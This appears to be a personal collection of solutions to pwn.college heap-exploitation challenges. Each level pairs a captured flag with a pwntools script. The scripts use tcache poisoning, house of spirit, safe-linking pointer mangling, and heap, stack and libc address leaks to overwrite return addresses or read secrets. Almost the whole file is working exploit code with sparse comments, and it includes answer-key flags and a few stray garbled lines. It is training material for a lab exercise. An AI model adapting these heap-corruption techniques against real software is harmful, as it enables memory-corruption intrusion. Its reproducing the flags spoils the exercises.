@@ -1,0 +1,923 @@
+1.0. pwn.college{YMHzW7lR8XXAtiJdjzol99l5MrT.QXxczMsITNxUzW}
+def challenge1():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'503'
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(b'malloc')
+        p.sendline(malloc_size)
+        info(p.clean())
+        p.sendline(b'free')
+        info(p.clean())
+        p.sendline(b'read_flag')
+        info(p.clean())
+        p.sendline(b'puts')
+        info(p.clean())
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+1.1. pwn.college{Qp76vdCIM9xH4EQm6LHZIvP44bF.QXyczMsITNxUzW}
+changes... 
+    malloc_size = b'378'
+
+
+2.0. pwn.college{wfVrBMSUkPOF3jGV-IBzQU9DUjc.QXzczMsITNxUzW}
+changes...
+    malloc_size = b'205'
+
+
+2.1. pwn.college{wCj2xHmrlDs5GbTAjdY85vvN8KM.QX0czMsITNxUzW}
+def challenge2():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    for i in range(128, (128+872)):
+        malloc_size = f'{i}'.encode()
+        with process([CHALLENGE_NAME], close_fds=False) as p:
+            p.clean()
+            p.sendline(b'malloc')
+            p.sendline(malloc_size)
+            p.sendline(b'free')
+            p.sendline(b'read_flag')
+            p.sendline(b'puts')
+            p.sendline(b'quit')
+            output = p.clean()
+            if b'pwn' in output:
+                info(output)
+                break
+            p.poll(block=True)
+
+3.0. pwn.college{wbGcY8fFJeZCANno4ZX8WciMM1f.QX1czMsITNxUzW}
+def challenge3():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'773'
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        p.clean()
+        p.sendline(b'malloc')
+        p.sendline(b'0')
+        p.sendline(malloc_size)
+        p.sendline(b'malloc')
+        p.sendline(b'1')
+        p.sendline(malloc_size)
+        p.sendline(b'free')
+        p.sendline(b'0')
+        p.sendline(b'free')
+        p.sendline(b'1')
+        p.sendline(b'read_flag')
+        p.sendline(b'puts')
+        p.sendline(b'0')
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+3.1. pwn.college{sBtJne8kEjEtQC2DafeR9aQWPPG.QX2czMsITNxUzW}
+changes...
+    malloc_size = b'832'
+
+
+4.0. pwn.college{wi9qeMOT4odUDidvJogEdW6lI7F.QX3czMsITNxUzW}
+def challenge4():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'372'
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        p.clean()
+        p.sendline(b'malloc')
+        p.sendline(malloc_size)
+        p.sendline(b'free')
+        p.sendline(b'scanf')
+        p.sendline(b'a'*100)
+        p.sendline(b'free')
+        p.sendline(b'read_flag')
+        p.sendline(b'puts')
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+4.1. pwn.college{siLKfhagBxBRTe5qo8OHHsQC0Bx.QX4czMsITNxUzW}
+changes...
+    malloc_size = b'305'
+
+
+
+5.0. pwn.college{A3z5u6mLxibjzQEVlEnyZ53AshT.QX5czMsITNxUzW}
+def challenge5():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'424'
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        p.clean()
+        p.sendline(b'malloc')
+        p.sendline(b'0')
+        p.sendline(malloc_size)
+        p.sendline(b'malloc')
+        p.sendline(b'1')
+        p.sendline(malloc_size)
+        p.sendline(b'free')
+        p.sendline(b'0')
+        p.sendline(b'free')
+        p.sendline(b'1')
+        p.sendline(b'read_flag')
+        p.sendline(b'free')
+        p.sendline(b'1')
+        p.sendline(b'puts_flag')
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+5.1. pwn.college{wvLnesLtsNJwepIVzsBFbLbFsun.QXwgzMsITNxUzW}
+changes...
+    malloc_size = b'296'
+
+
+6.0. pwn.college{UZYyGY_m8ItTnS6AHckNz5hbkAk.QXxgzMsITNxUzW}
+def challenge6():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'16'
+    read_addr = p64(0x42962c)
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        p.clean()
+        p.sendline(b'malloc')
+        p.sendline(b'0')
+        p.sendline(malloc_size)
+        p.sendline(b'malloc')
+        p.sendline(b'1')
+        p.sendline(malloc_size)
+        p.sendline(b'free')
+        p.sendline(b'1')
+        p.sendline(b'free')
+        p.sendline(b'0')
+        p.sendline(b'scanf')
+        p.sendline(b'0')
+        p.sendline(read_addr)
+        p.sendline(b'malloc')
+        p.sendline(b'0')
+        p.sendline(malloc_size)
+        p.sendline(b'malloc')
+        p.sendline(b'1')
+        p.sendline(malloc_size)
+        p.sendline(b'puts')
+        p.sendline(b'0')
+        p.sendline(b'puts')
+        p.sendline(b'1')
+        info(p.readuntil(b'[*] puts(allocations[1])\nData: '))
+        secret = p.readline().strip()
+        p.sendline(b'send_flag')
+        p.sendline(secret)
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+6.1. pwn.college{wEwD-UX7z4C4cYH2A7kOQtTnWtR.QXygzMsITNxUzW}
+def challenge6():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'16'
+    read_addr = p64(0x422961)
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        p.clean()
+        p.sendline(b'malloc')
+        p.sendline(b'0')
+        p.sendline(malloc_size)
+        p.sendline(b'malloc')
+        p.sendline(b'1')
+        p.sendline(malloc_size)
+        p.sendline(b'free')
+        p.sendline(b'1')
+        p.sendline(b'free')
+        p.sendline(b'0')
+        p.sendline(b'scanf')
+        p.sendline(b'0')
+        p.sendline(read_addr)
+        p.sendline(b'malloc')
+        p.sendline(b'0')
+        p.sendline(malloc_size)
+        p.sendline(b'malloc')
+        p.sendline(b'1')
+        p.sendline(malloc_size)
+        p.sendline(b'puts')
+        p.sendline(b'0')
+        p.sendline(b'puts')
+        p.sendline(b'1')
+        info(p.readuntil(b'Data: '))
+        info(p.readuntil(b'Data: '))
+        secret = p.readline().strip()
+        p.sendline(b'send_flag')
+        p.sendline(secret)
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+7.0. pwn.college{oat1epDszyjrgWZoKIDA8s8YTJm.QXzgzMsITNxUzW}
+def challenge7():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'16'
+    read_addr1 = p64(0x42AB29)
+    read_addr2 = p64(0x42AB29+8)
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        p.clean()
+        p.sendline(b'malloc')
+        p.sendline(b'0')
+        p.sendline(malloc_size)
+        p.sendline(b'malloc')
+        p.sendline(b'1')
+        p.sendline(malloc_size)
+        p.sendline(b'free')
+        p.sendline(b'1')
+        p.sendline(b'free')
+        p.sendline(b'0')
+        p.sendline(b'scanf')
+        p.sendline(b'0')
+        p.sendline(read_addr2)
+        p.sendline(b'malloc')
+        p.sendline(b'0')
+        p.sendline(malloc_size)
+        p.sendline(b'malloc')
+        p.sendline(b'1')
+        p.sendline(malloc_size)
+        p.sendline(b'puts')
+        p.sendline(b'0')
+        p.sendline(b'puts')
+        p.sendline(b'1')
+        info(p.readuntil(b'Data: '))
+        info(p.readuntil(b'Data: '))
+        secret1 = p.readline().strip()
+        p.sendline(b'malloc')
+        p.sendline(b'0')
+        p.sendline(malloc_size)
+        p.sendline(b'malloc')
+        p.sendline(b'1')
+        p.sendline(malloc_size)
+        p.sendline(b'free')
+        p.sendline(b'1')
+        p.sendline(b'free')
+        p.sendline(b'0')
+        p.sendline(b'scanf')
+        p.sendline(b'0')
+        p.sendline(read_addr1)
+        p.sendline(b'malloc')
+        p.sendline(b'0')
+        p.sendline(malloc_size)
+        p.sendline(b'malloc')
+        p.sendline(b'1')
+        p.sendline(malloc_size)
+        p.sendline(b'puts')
+        p.sendline(b'0')
+        p.sendline(b'puts')
+        p.sendline(b'1')
+        info(p.readuntil(b'Data: '))
+        info(p.readuntil(b'Data: '))
+        secret2 = p.readline().strip()
+        secret = secret2+secret1
+        p.sendline(b'quit')
+        info(p.clean())
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        p.sendline(b'send_flag')
+        p.sendline(secret)
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+7.1. pwn.college{81m6mMEbVtWlqcvaL7GqnkbyH3V.QX0gzMsITNxUzW}
+changes...
+    read_addr1 = p64(0x42AE41)
+    read_addr2 = p64(0x42AE41+8)
+
+
+8.0. pwn.college{AJg2zXrEEy7pJW16m8XTxsgkU6R.QX1gzMsITNxUzW}
+def challenge8():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'80'
+    read_addr1 = p64(0x424B0A-64)
+    read_addr2 = p64(0x424B0A+8)
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        p.clean()
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        p.sendline(b'free\n1')
+        p.sendline(b'free\n0')
+        p.sendline(b'scanf\n0\n' + read_addr1)
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        info(p.clean())
+        p.sendline(b'scanf\n1\n' + b'a'*80)
+        p.sendline(b'puts\n1')
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        p.sendline(b'free\n1')
+        p.sendline(b'free\n0')
+        p.sendline(b'scanf\n0\n' + read_addr2)
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        p.sendline(b'send_flag\n' + b'a'*16)
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+8.1. pwn.college{kd_Elnj4-r9TK5CubywkkZo0IGE.QX2gzMsITNxUzW}
+changes...
+    read_addr1 = p64(0x429E0A-64)
+    read_addr2 = p64(0x429E0A+8)
+
+
+9.0. pwn.college{A8pbxnqWo_e8yTFHxxPhXUQAoOS.QX3gzMsITNxUzW}
+def challenge9():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'80'
+    read_addr1 = p64(0x426364)
+    read_addr2 = p64(0x426364+8)
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        p.clean()
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        p.sendline(b'free\n1')
+        p.sendline(b'free\n0')
+        p.sendline(b'scanf\n0\n' + read_addr2)
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        p.sendline(b'free\n1')
+        p.sendline(b'free\n0')
+        p.sendline(b'scanf\n0\n' + read_addr2)
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        p.sendline(b'free\n1')
+        p.sendline(b'free\n0')
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'puts\n0')
+        info(p.readuntil(b'Data: '))
+        secret2 = p.readline().strip()
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        p.sendline(b'free\n1')
+        p.sendline(b'free\n0')
+        p.sendline(b'scanf\n0\n' + read_addr1)
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        p.sendline(b'free\n1')
+        p.sendline(b'free\n0')
+        p.sendline(b'scanf\n0\n' + read_addr1)
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        p.sendline(b'free\n1')
+        p.sendline(b'free\n0')
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        p.sendline(b'puts\n0')
+        info(p.readuntil(b'Data: '))
+        secret1 = p.readline().strip()
+        secret = secret1+secret2
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        p.sendline(b'send_flag\n' + secret)
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+secret = b'msxthd'
+secret = b'msxthd'
+yqmsxthd cequffeu
+
+9.1. pwn.college{ERy_1cRKCyAxCcIJcZtqYQH24QH.QX4gzMsITNxUzW}
+changes...
+    read_addr1 = p64(0x422A68)
+    read_addr2 = p64(0x422A68+8)
+
+
+10.0. pwn.college{8YtXH0BNLbXjtZrE-ck1WqX79ZK.QX5gzMsITNxUzW}
+def challenge10():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'16'
+    win_offset = 253
+    return_offset = 280
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.readuntil(b'is at: '))
+        stack_leak = int(p.readlineb().strip().decode()[:-1], 16)
+        info(p.readuntil(b'is at: '))
+        address_of_main = int(p.readlineb().strip().decode()[:-1], 16)
+        print(f'stack: {hex(stack_leak)}, main: {hex(address_of_main)}')
+        win = address_of_main - win_offset
+        return_address = stack_leak + 280
+        info(p.clean())
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        info(p.clean())
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        info(p.clean())
+        p.sendline(b'free\n1')
+        info(p.clean())
+        p.sendline(b'free\n0')
+        info(p.clean())
+        p.sendline(b'scanf\n0\n' + p64(return_address))
+        info(p.clean())
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        info(p.clean())
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        info(p.clean())
+        p.sendline(b'scanf\n1\n' + p64(win))
+        info(p.clean())
+        p.sendline('quit\n')
+        info(p.clean())
+        p.poll(block=True)
+
+
+10.1. pwn.college{Mg7hPR5WZP5ZSHPK4I11x1QzKE4.QXwkzMsITNxUzW}
+no changes...
+
+
+11.0. pwn.college{UGeNjXyq3Ps51j1psgj8JecCzqT.QXxkzMsITNxUzW}
+def challenge11():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'32'
+    win_offset = 6392
+    return_offset = 374
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        info(p.clean())
+        p.sendline(b'free\n0')
+        info(p.clean())
+        p.sendline(b'echo\n0\n0')
+        info(p.readuntil(b'Data: '))
+        pie_leak = int.from_bytes(p.readlineb().strip(), 'little')
+        p.sendline(b'echo\n0\n8')
+        info(p.readuntil(b'Data: '))
+        stack_leak = int.from_bytes(p.readlineb().strip(), 'little')
+        print(f'pie leak: {hex(pie_leak)}, stack leak: {hex(stack_leak)}')
+        win = pie_leak - win_offset
+        return_address = stack_leak + return_offset
+        info(p.clean())
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        info(p.clean())
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        info(p.clean())
+        p.sendline(b'free\n1')
+        info(p.clean())
+        p.sendline(b'free\n0')
+        info(p.clean())
+        p.sendline(b'scanf\n0\n' + p64(return_address))
+        info(p.clean())
+        p.sendline(b'malloc\n0\n' + malloc_size)
+        info(p.clean())
+        p.sendline(b'malloc\n1\n' + malloc_size)
+        info(p.clean())
+        p.sendline(b'scanf\n1\n' + p64(win))
+        info(p.clean())
+        p.sendline('quit\n')
+        info(p.clean())
+        p.poll(block=True)
+
+11.1. pwn.college{0TetNt8nh5ibs6S0yT_G_CAIVRK.QXykzMsITNxUzW}
+changes...
+    win_offset = 3088
+
+
+12.0. pwn.college{sfwTrevN6WT3Glfm0DoGtMubVC2.QXzkzMsITNxUzW}
+# house of spirit
+def challenge12():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    padding = b'a'*48
+    malloc_prev_size = p64(0x00)
+    malloc_size = p64(0x61)
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(b'stack_malloc_win')
+        info(p.clean())
+        p.sendline(b'stack_scanf\n' + padding + malloc_prev_size + malloc_size)
+        info(p.clean())
+        p.sendline(b'stack_free')
+        info(p.clean())
+        p.sendline(b'stack_malloc_win')
+        info(p.clean())
+        p.poll(block=True)
+
+12.1. pwn.college{EVbKFdQHP0Py1svCEbCgNq0spQ0.QX0kzMsITNxUzW}
+same script
+
+
+13.0. pwn.college{s5R45ijUsDhdFThDsUFx_xM2WvX.QX1kzMsITNxUzW}
+def challenge13():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    padding = b'a'*48
+    tcache_prev_size = p64(0x00)
+    tcache_size = p64(0xc1)
+    payload = b'a'*180
+    secret = b'a'*16
+    malloc_size = b'170'
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(b'stack_scanf\n' + padding + tcache_prev_size + tcache_size)
+        info(p.clean())
+        p.sendline(b'stack_free')
+        info(p.clean())
+        p.sendline(b'malloc 0 ' + malloc_size)
+        info(p.clean())
+        p.sendline(b'scanf 0\n' + payload)
+        info(p.clean())
+        p.sendline(b'send_flag\n' + secret)
+        info(p.clean())
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+13.1. pwn.college{MdCcyo-TYWxn5qQ9tAlXKd5Ixh3.QX2kzMsITNxUzW}
+same script...
+
+
+14.0. pwn.college{sngeyzllFFTbW7s1ZdjOk5NsYYE.QX3kzMsITNxUzW}
+def challenge14():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'32'
+    win_offset = 6614
+    return_offset = 232
+    padding = b'a'*48
+    tcache_prev_size = p64(0x00)
+    tcache_size = p64(0x31)
+    stack_offset = b'64'
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(b'malloc 0 ' + malloc_size)
+        info(p.clean())
+        p.sendline(b'free 0')
+        info(p.clean())
+        p.sendline(b'echo 0 0')
+        info(p.readuntil(b'Data: '))
+        pie_leak = int.from_bytes(p.readlineb().strip(), 'little')
+        p.sendline(b'stack_scanf\n' + padding + tcache_prev_size + tcache_size)
+        info(p.clean())
+        p.sendline(b'stack_free')
+        info(p.clean())
+        p.sendline(b'malloc 0 ' + malloc_size)
+        info(p.clean())
+        p.sendline(b'echo 0 ' + stack_offset)
+        info(p.readuntil(b'Data: '))
+        stack_leak = int.from_bytes(p.readlineb().strip(), 'little')
+        print(f'pie leak: {hex(pie_leak)}, stack leak: {hex(stack_leak)}')
+        win = pie_leak - win_offset
+        return_address = stack_leak - return_offset
+        info(p.clean())
+        p.sendline(b'malloc 0 ' + malloc_size)
+        info(p.clean())
+        p.sendline(b'malloc 1 ' + malloc_size)
+        info(p.clean())
+        p.sendline(b'free 1')
+        info(p.clean())
+        p.sendline(b'free 0')
+        info(p.clean())
+        p.sendline(b'scanf 0 ' + p64(return_address))
+        info(p.clean())
+        p.sendline(b'malloc 0 ' + malloc_size)
+        info(p.clean())
+        p.sendline(b'malloc 1 ' + malloc_size)
+        info(p.clean())
+        p.sendline(b'scanf 1 ' + p64(win))
+        info(p.clean())
+        p.sendline('quit')
+        info(p.clean())
+        p.poll(block=True)
+
+14.1. pwn.college{se8jpfZIZiupI1cPoO-ogMcnSDh.QX4kzMsITNxUzW}
+changes...
+    win_offset = 3330
+    return_offset = 232
+
+
+15.0. pwn.college{o9mPOcYFW2BCU32YuuLU5lQMDZi.QX5kzMsITNxUzW}
+def challenge15():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    malloc_size = b'16'
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(b'malloc 0 ' + malloc_size)
+        info(p.clean())
+        # leak the data using echo
+        # offset 32 is a pie address
+        # offset 40 is a stack address
+        p.sendline(b'echo 0 32')
+        info(p.readuntil(b'Data: '))
+        pie_addr = int.from_bytes(p.readline().strip(), 'little')
+        print(hex(pie_addr))
+        p.sendline(b'echo 0 40')
+        info(p.readuntil(b'Data: '))
+        stack_addr = int.from_bytes(p.readline().strip(), 'little')
+        print(hex(stack_addr))
+        return_address = stack_addr + 374
+        win = pie_addr - 6392
+        print(f'win = {hex(win)}')
+        print(f'ret = {hex(return_address)}')
+        # malloc 3 times to get a new heap
+        p.sendline(b'malloc 0 16')
+        p.sendline(b'malloc 1 16')
+        p.sendline(b'malloc 2 16')
+        # free is reverse order because of how tcache is
+        p.sendline(b'free 2')
+        p.sendline(b'free 1')
+        # overwrite the next pointer with the return address
+        # also need to preserve the metadata 
+        p.sendline(b'read 0 40')
+        p.send(b'a'*16 + p64(0x00) + p64(0x21) + p64(return_address))
+        p.sendline(b'malloc 1 16')
+        p.sendline(b'malloc 2 16')
+        # now malloc 2 should point to the return address
+        p.sendline(b'read 2 8')
+        # overwrite the return address with win
+        p.send(p64(win))
+        info(p.clean())
+        p.sendline('quit')
+        info(p.clean())
+        p.poll(block=True)
+
+15.1. pwn.college{UiNnbHMfYEv49MuMOdeV5AnhdE8.QXwADNsITNxUzW}
+changes...
+    return_address = stack_addr + 22
+    win = pie_addr - 3344
+    
+16.0. pwn.college{kequ9aze79Kxm8ngwbFC5QSki0d.0FO4QzMsITNxUzW}
+def challenge16():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    secret_addr = 0x43BBC0
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(b'malloc 0 16')
+        p.sendline(b'malloc 1 16')
+        p.sendline(b'malloc 2 16')
+        p.sendline(b'free 2')
+        p.sendline(b'free 0')
+        p.sendline(b'free 1')
+        p.sendline(b'puts 1')
+        info(p.readuntil(b'Data: '))
+        heap_leak = int.from_bytes(p.readline().strip(), 'little')
+        print(hex(heap_leak >> 12))
+        read_addr1 = p64(secret_addr ^ (heap_leak >> 12) - 1)
+        info(p.clean())
+        p.sendline(b'scanf 1 ' + read_addr1)
+        info(p.clean())
+        p.sendline(b'malloc 0 16')
+        p.sendline(b'malloc 1 16')
+        p.sendline(f'free 0')
+        p.sendline(f'puts 0')
+        info(p.readuntil(b'Data: '))
+        secret2 = p.readline().strip()
+        print(f'secret = {secret2}')
+        secret = int.from_bytes(secret2[0:8], "little") ^ (heap_leak >> 12)
+        secret = secret ^ (secret_addr >> 12) 
+        secret = (secret + 1).to_bytes(8, 'little')
+        p.sendline(b'send_flag\n' + secret)       
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+16.1. pwn.college{4zA4kTbOAvRSlVW3zCh0cIkPCTA.0VO4QzMsITNxUzW}
+changes...
+    secret_addr = 0x424060
+
+17.0. pwn.college{4aXvmr2mmeGCtwuSgGTQJDJfa3c.0FM5QzMsITNxUzW}
+added these functions...
+def demangle(ptr):
+    middle = ptr ^ (ptr >> 12)
+    return (middle ^ (middle >> 24))
+
+def mangle(pos, ptr):
+    return ((pos >> 12) ^ ptr)
+
+def challenge17():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    return_offset = 280
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        # get the address of win and the address of saved rip
+        info(p.readuntil(b'is at: '))
+        stack_leak = int(p.readlineb().strip().decode()[:-1], 16)
+        info(p.readuntil(b'is at: '))
+        address_of_main = int(p.readlineb().strip().decode()[:-1], 16)
+        print(f'stack: {hex(stack_leak)}, main: {hex(address_of_main)}')
+        binary.address = address_of_main - binary.symbols['main']
+        return_address = stack_leak + return_offset
+
+        info(p.clean())
+        # get a heap leak
+        p.sendline(b'malloc 1 32')
+        p.sendline(b'malloc 2 32')
+        p.sendline(b'free 1')
+        p.sendline(b'free 2')
+        p.sendline(b'puts 2')
+        info(p.readuntil(b'Data: '))
+        heap_leak = demangle(int.from_bytes(p.readline().strip(), 'little'))
+        mangled_alloc_address = mangle(heap_leak, stack_leak)
+        # set the second index to be the start of the alloc array
+        p.sendline(b'scanf 2 ' + p64(mangled_alloc_address))
+        # malloc twice, second index should point to the alloc address from above
+        p.sendline(b'malloc 1 32')
+        p.sendline(b'malloc 2 32')
+        # this makes alloc[0] = return address
+        p.sendline(b'scanf 2 ' + p64(return_address))
+        # deref alloc[0] to overwrite the return address with win
+        p.sendline(b'scanf 0 ' + p64(binary.symbols['win']))
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+17.1. pwn.college{kchOur0iaD1tJ4U0lmO7UEs4seb.0VM5QzMsITNxUzW}
+changes...
+    return_offset = 0x168
+
+
+18.0. pwn.college{kRB17kpGa_aVIx7NJR2iUJ0c4bm.0lM5QzMsITNxUzW}
+same as challenge 13...
+
+18.1. pwn.college{gmPSyZwidGrwgvyLzR2QFjIk0VB.01M5QzMsITNxUzW}
+same as challenge 13...
+
+19.0. pwn.college{gcSWlqahi-iJBximYufqQ_SfB8_.0FN5QzMsITNxUzW}
+def challenge19():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    
+
+    # with gdb.debug([CHALLENGE_NAME], '''
+    # disp/5i $rip
+    # disp/40gx $rsp
+    # b *main+1357
+    # c
+    # ''') as p:
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        # heap will look like
+        # [META|ALLOC(32)][META|ALLOC(32)][META|ALLOC(978)]
+        p.sendline(b'malloc 1 32')
+        p.sendline(b'malloc 2 32')
+        p.sendline(b'read_flag')
+        p.sendline(b'safe_read 1')
+        # read into alloc(1) and overwrite the metadata of alloc(2)
+        # 0x71 will allow for a size of 90 bytes
+        p.send(b'a'*32 + p64(0x00) + p64(0x71))
+        # free the allocation with corrupted metadata so it is in the tcache
+        p.sendline(b'free 2')
+        # malloc again and get the chunk from the tcache
+        p.sendline(b'malloc 3 90')
+        # the chunk overlaps with the flag that was read into memory
+        # so you can just write the flag out now
+        p.sendline(b'safe_write 3')
+        info(p.clean())
+        p.poll(block=True)
+
+19.1. pwn.college{cDK82swJkWPgAww78USYNlim_py.0VN5QzMsITNxUzW}  
+same as above...
+
+20.0. pwn.college{oxGPpgTut7okMonM9adtHXgWUXR.0lN5QzMsITNxUzW}
+def challenge20():
+    libc = ELF(f"/challenge/lib/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    
+    
+    # with gdb.debug([CHALLENGE_NAME], '''
+    # disp/5i $rip
+    # disp/40gx $rsp
+    # b *main+1674
+    # c
+    # ''') as p:
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        # malloc 100 bytes to set the length for later 
+        p.sendline(b'malloc 0 100')
+        # leak a heap address and the address of libc
+        p.sendline(b'malloc 1 32')
+        p.sendline(b'malloc 2 32')
+        p.sendline(b'safe_write 1')
+        p.sendline(b'safe_read 1')
+        # you can leak stuff my using overlapping allocaions
+        p.send(b'a'*32 + p64(0x00) + p64(0x161))
+        info(p.clean())
+        # free here to add to the 0x161 tcache when actual size is just 32 bytes
+        p.sendline(b'free 2')
+        p.sendline(b'malloc 3 344')
+        p.sendline(b'safe_write 3')
+        info(p.readuntil(b'[*] safe_write(allocations[3])\n'))
+        leak = int.from_bytes(p.readline().strip(), 'little')
+        file_address = int(hex(leak)[146:158], 16) - 240
+        io_file_jumps = int(hex(leak)[34:46], 16)
+        libc.address = io_file_jumps - libc.symbols['_IO_file_jumps']
+        print(hex(libc.address))
+        # obtain this value using 'scan libc stack' in gef
+        stack_leak = libc.address+0x21aa20
+
+        # set the next pointer of one of the allocations to be the stack_leak
+        p.sendline(b'malloc 4 32')
+        p.sendline(b'malloc 5 32')
+        p.sendline(b'malloc 6 32')
+        p.sendline(b'safe_read 4')
+        p.send(b'a'*32 + p64(0x00) + p64(0x61))
+        p.sendline(b'free 5')
+        p.sendline(b'malloc 7 85')
+        p.sendline(b'free 4')
+        p.sendline(b'free 6')
+        p.sendline(b'safe_read 7')
+        payload = b'a'*32 + p64(0x00) + p64(0x61) + p64(mangle(file_address, stack_leak))
+        p.send(payload)
+        p.sendline(b'malloc 8 35')
+        p.sendline(b'malloc 9 35')
+        p.sendline(b'safe_write 9')
+        info(p.readuntil(b'[*] safe_write(allocations[9])\n'))
+        # should leak a value from the stack for you
+        leak = int.from_bytes(p.readline().strip(), 'little')
+        print(hex(leak))
+        # now you have the location of alloc[0] and rip
+        rip = int(hex(leak), 16) - 272
+        alloc = int(hex(leak), 16) - 680
+        info(p.clean())
+        print(f'RIP is {hex(rip)}')
+        # now you can do overlapping again to overwrite the allocation address into memory
+        p.sendline(b'malloc 4 16')
+        p.sendline(b'malloc 5 16')
